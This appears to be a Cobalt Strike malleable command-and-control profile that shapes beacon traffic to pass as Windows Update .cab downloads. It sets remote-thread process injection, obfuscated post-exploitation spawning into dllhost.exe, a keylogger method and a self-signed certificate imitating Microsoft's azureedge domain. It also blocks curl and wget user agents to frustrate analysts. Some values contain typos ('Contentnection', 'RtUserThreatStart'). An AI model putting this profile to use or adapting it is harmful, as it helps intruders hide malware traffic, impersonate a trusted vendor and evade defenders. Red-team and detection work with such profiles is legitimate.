#Author: Stigs - WKL



### Auxiliary Settings ###

set sample_name "Stigs Random C2 Profile";
set host_stage "false";  # Host payload for staging over HTTP, HTTPS, or DNS. Required by stagers.
set sleeptime "81022";
set pipename "pgsj_##";
set pipename_stager "ztrq_##";
set jitter "33";        #       Default jitter factor (0-99%)
set useragent "<RAND>"; # "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"; Use random Internet Explorer UA by default
set create_remote_thread "true"; # Allow beacon to create threads in other processes
set hijack_remote_thread "true"; # Allow beacon to run jobs by hijacking the primary thread of a suspeneded process
set tasks_max_size "3604500";



### Main HTTP Config Settings ###

http-config {
  set headers "Date, Server, Content-Length, Keep-Alive, Contentnection, Content-Type";
  header "Server" "Apache";
  header "Keep-Alive" "timeout=10, max=100";
  header "Connection" "Keep-Alive";
  set trust_x_forwarded_for "true";
  set block_useragents "curl*,lynx*,wget*";
}




### HTTPS Cert Settings ###

https-certificate {
# Self Signed Certificate Options
       set CN       "*.azureedge.net";
       set O        "Microsoft Corporation";
       set C        "US";
       set L        "Redmond";
       set ST       "WA";
       set OU       "Organizational Unit";
       set validity "365";

# Imported Certificate Options
#        set keystore "domain.store";
#        set password "password";
}

# code-signer {
#       set keystore "keystore.jks";
#       set password "password";
#       set alias "server";
#       set digest_algorithm "SHA256";
#       set timestamp "false";
#       set timestamp_url "http://timestamp.digicert.com";
#}




### Post Exploitation Settings ###

post-ex {
    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
    set obfuscate "true";
    set smartinject "true";
    set amsi_disable "false";
    set keylogger "GetAsyncKeyState";
    #set threadhint "module!function+0x##"
}




### Process Injection ###

process-inject {
  set allocator "NtMapViewOfSection"; # or VirtualAllocEx
  set min_alloc "24576";
  set startrwx "false";
  set userwx "false";

  transform-x86 {
          prepend "\x90\x90";
          #append
  }

  transform-x64 {
          #prepend "\x90\x90";
          #append
  }

  execute {
      CreateThread "ntdll!RtlUserThreadStart";
      CreateThread;
      NtQueueApcThread-s;
      CreateRemoteThread "ntdll!RtUserThreatStart";
      RtlCreateUserThread;
      SetThreadContext;
  }
}




### No idea why this is needed lol ###
http-get {
        set verb "GET"; # GET / POST
        set uri "/css3/index2.shtml";  # Can be space separated string. Each beacon will be assigned one of these when the stage is built

        client {
                header "Accept" "text/html, application/xhtml+xml, image/jxr, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "Accept-Language" "en-US; q=0.7, en; q=0.3";
                header "Connection" "keep-alive";
                header "DNT" "1";

                metadata {
                        base64url;
                        parameter "accept";
                }
        }

        server {
                header "Content-Type" "application/yin+xml";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output{
                        base64;
                        print;
                }
        }
}

http-post {
        set verb "POST"; # GET / POST
        set uri "/tools/family.html";
        client {
                header "Accept" "text/html, application/xhtml+xml, */*";
                header "Accept-Encoding" "gzip, deflate";
                header "DNT" "1";
                header "Content-Type" "application/x-www-form-urlencoded";

                id {
                        base64;
                        prepend "token=";
                        header "Cookie";
                }

                output{
                        base64url;
                        prepend "input=";
                        print;
                }
        }

        server {
                header "Content-Type" "text/vnd.fly";
                header "Server" "IBM_HTTP_Server/6.0.2.19 Apache/2.0.47 (Unix) DAV/2";

                output {
                        base64;
                        print;
                }
        }
}





### Start of Real HTTP GET and POST settings ###

http-get "WindowsUpdates" {

    set verb "GET";
    set uri "/c/msdownload/update/others/2016/12/29136388_";

    client {

        header "Accept" "*/*";
        header "Host" "download.windowsupdate.com";
        
        #session metadata
        metadata {
            base64url;
            append ".cab";
            uri-append;
        }
    }


    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #Beacon's tasks
        output {

            print;
        }
    }
}

http-post "WindowsUpdates" {
    
    set verb "POST";
    set uri "/c/msdownload/update/others/2016/12/3215234_";

    client {

        header "Accept" "*/*";

        #session ID
        id {
            prepend "download.windowsupdate.com/c/";
            header "Host";
        }


        #Beacon's responses
        output {
            base64url;
            append ".cab";
            uri-append;
        }
    }

    server {
        header "Content-Type" "application/vnd.ms-cab-compressed";
        header "Server" "Microsoft-IIS/8.5";
        header "MSRegion" "N. America";
        header "Connection" "keep-alive";
        header "X-Powered-By" "ASP.NET";

        #empty
        output {
            print;
        }
    }
}